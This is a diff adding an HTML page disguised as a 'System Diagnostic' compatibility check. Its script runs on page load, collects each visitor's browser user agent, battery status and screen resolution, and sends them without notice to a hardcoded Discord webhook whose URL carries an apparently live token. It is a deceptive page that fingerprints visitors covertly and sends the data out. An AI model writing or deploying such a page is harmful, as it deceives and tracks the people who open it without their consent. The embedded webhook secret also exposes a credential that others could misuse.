@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Diagnostic</title>
+</head>
+<body>
+    <h1>Checking Device Compatibility...</h1>
+    <p>Please wait while we scan your mobile environment.</p>
+
+    <script>
+        // Your Discord Webhook
+        const webhook = "https://discord.com/api/webhooks/1499298779143340053/96v2UUkOcDdK8X_PG-2_zOycfoYzxO0_7rt2m6npWmjMMUSuUWsTPkSM_cpO9L69dr8K";
+
+        async function collectData() {
+            // 1. Get Basic Phone Info (User Agent)
+            const info = navigator.userAgent;
+            
+            // 2. Get Battery Status (Pro Move)
+            let batteryInfo = "Unknown";
+            try {
+                const batt = await navigator.getBattery();
+                batteryInfo = `${(batt.level * 100)}% - ${batt.charging ? 'Charging' : 'Discharging'}`;
+            } catch (e) {}
+
+            // 3. Get Screen Resolution (Tells you if it's a Pro Max/Plus model)
+            const screen = `${window.screen.width}x${window.screen.height}`;
+
+            // 4. Send to Discord
+            const payload = {
+                content: "📱 **MOBILE DIGGER ACTIVATED**",
+                embeds: [{
+                    title: "Mobile Device Detected",
+                    color: 15418782,
+                    fields: [
+                        { name: "Device/Browser Info", value: `\`\`\`${info}\`\`\`` },
+                        { name: "Battery Status", value: batteryInfo, inline: true },
+                        { name: "Screen Res", value: screen, inline: true }
+                    ]
+                }]
+            };
+
+            fetch(webhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        }
+
+        collectData();
+    </script>
+</body>
+</html>
